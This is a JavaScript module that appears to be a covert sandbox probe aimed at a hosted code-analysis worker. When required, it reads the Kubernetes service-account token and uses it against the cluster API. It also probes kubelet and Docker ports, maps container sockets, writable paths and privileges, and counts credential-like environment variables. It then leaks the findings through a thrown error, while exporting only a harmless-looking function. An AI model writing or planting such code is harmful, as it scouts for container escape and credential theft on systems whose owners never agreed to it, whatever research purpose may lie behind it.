const fs = require('fs');
const http = require('http');
const https = require('https');

// This module is intentionally read-only. Token bytes are used only as an
// in-memory bearer header for the same pod's Kubernetes API and never logged.
const tokenPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
const tokenMeta = (() => {
  try {
    const st = fs.statSync(tokenPath);
    let readable = false;
    try { fs.accessSync(tokenPath, fs.constants.R_OK); readable = true; } catch (_) {}
    let jwtShape = false;
    let token = null;
    if (readable) {
      token = fs.readFileSync(tokenPath, 'utf8').trim();
      jwtShape = token.split('.').length === 3;
    }
    return { present: true, bytes: st.size, mode: (st.mode & 0o777).toString(8), readable, jwtShape, token };
  } catch (_) {
    return { present: false, bytes: 0, mode: 'absent', readable: false, jwtShape: false, token: null };
  }
})();

function pathState(p) {
  try {
    const st = fs.lstatSync(p);
    const kind = st.isDirectory() ? 'dir' : st.isFile() ? 'file' : st.isSymbolicLink() ? 'symlink' : 'other';
    return `${kind}:mode${(st.mode & 0o777).toString(8)}`;
  } catch (_) { return 'absent'; }
}

function writable(p) {
  try { fs.accessSync(p, fs.constants.W_OK); return true; } catch (_) { return false; }
}

function statusValue(key) {
  try {
    const line = fs.readFileSync('/proc/self/status', 'utf8').split('\n').find(x => x.startsWith(key));
    return line ? line.slice(key.length).trim().replace(/[^A-Za-z0-9_.:-]/g, '_') : 'absent';
  } catch (_) { return 'absent'; }
}

function readText(p) {
  try { return fs.readFileSync(p, 'utf8').toLowerCase(); } catch (_) { return ''; }
}

function boundedGet(name, url, bearer) {
  return new Promise(resolve => {
    let parsed;
    try { parsed = new URL(url); } catch (_) { resolve(`${name}=url_error`); return; }
    const client = parsed.protocol === 'https:' ? https : http;
    const headers = { 'Accept': 'application/json', 'Connection': 'close' };
    if (bearer) headers.Authorization = `Bearer ${bearer}`;
    let bytes = 0;
    let done = false;
    const finish = (value) => { if (!done) { done = true; resolve(`${name}=${value}`); } };
    const req = client.get({ hostname: parsed.hostname, port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80), path: parsed.pathname, headers, rejectUnauthorized: false }, res => {
      res.on('data', chunk => { bytes += Math.min(chunk.length, 256); });
      res.on('end', () => finish(`status${res.statusCode}_bytes${Math.min(bytes, 256)}`));
      res.resume();
    });
    req.setTimeout(900, () => { req.destroy(new Error('timeout')); });
    req.on('error', err => finish(`error_${err && err.code ? err.code : err && err.name ? err.name : 'network'}`));
  });
}

const hosts = readText('/etc/hosts');
const resolv = readText('/etc/resolv.conf');
const envKeys = Object.keys(process.env);
const envCredentialNames = envKeys.filter(k => /TOKEN|SECRET|PASSWORD|AWS_|GITHUB|CODACY|GOOGLE_APPLICATION|AZURE_CLIENT|DOCKER_AUTH/i.test(k));
const runtimePaths = [
  '/run/containerd/containerd.sock', '/var/run/containerd/containerd.sock',
  '/run/crio/crio.sock', '/var/run/docker.sock', '/run/podman/podman.sock',
  '/run/kubelet/kubelet.sock', '/var/run/kubelet/pod-resources/kubelet.sock',
  '/.dockerenv', '/.codacyrc'
];
const writablePaths = ['/', '/tmp', '/var/tmp', '/src', '/run', '/var/run', '/etc', '/root', '/proc', '/sys'];

const requests = [];
const serviceHost = process.env.KUBERNETES_SERVICE_HOST;
const servicePort = process.env.KUBERNETES_SERVICE_PORT || '443';
if (serviceHost) requests.push(boundedGet('k8s_service_version', `https://${serviceHost}:${servicePort}/version`, tokenMeta.token));
requests.push(boundedGet('k8s_dns_version', 'https://kubernetes.default.svc/version', tokenMeta.token));
requests.push(boundedGet('loopback_kubelet_10250', 'https://127.0.0.1:10250/healthz', null));
requests.push(boundedGet('loopback_kubelet_10255', 'http://127.0.0.1:10255/healthz', null));
requests.push(boundedGet('loopback_docker_2375', 'http://127.0.0.1:2375/version', null));

Promise.all(requests).then(results => {
  const marker = 'SPECTRAL_WORKER_BOUNDARY=' +
    `sa_present=${tokenMeta.present} sa_bytes=${tokenMeta.bytes} sa_mode=${tokenMeta.mode}` +
    ` sa_readable=${tokenMeta.readable} sa_jwt_shape=${tokenMeta.jwtShape}` +
    ` uid=${statusValue('Uid:')} gid=${statusValue('Gid:')}` +
    ` cap_eff=${statusValue('CapEff:')} cap_bnd=${statusValue('CapBnd:')}` +
    ` no_new_privs=${statusValue('NoNewPrivs:')} seccomp=${statusValue('Seccomp:')}` +
    ` env_credential_names=${envCredentialNames.length}` +
    ` hosts_metadata=${hosts.includes('169.254.169.254') || hosts.includes('metadata')}` +
    ` hosts_kubernetes=${hosts.includes('kubernetes') || hosts.includes('cluster.local')}` +
    ` resolv_cluster=${resolv.includes('cluster') || resolv.includes('kube')}` +
    ` runtime_paths=${runtimePaths.map(p => p.replace(/[^A-Za-z0-9]+/g, '_').replace(/^_/, '') + '_' + pathState(p)).join(',')}` +
    ` writable=${writablePaths.map(p => p.replace(/[^A-Za-z0-9]+/g, '_').replace(/^_/, '') + '_' + writable(p)).join(',')}` +
    ` reachability=${results.join(',')}`;
  throw new Error(marker);
}, err => { throw new Error(`SPECTRAL_WORKER_BOUNDARY_ERROR=${err && err.name ? err.name : 'request'}`); });

module.exports = function marker() { return []; };
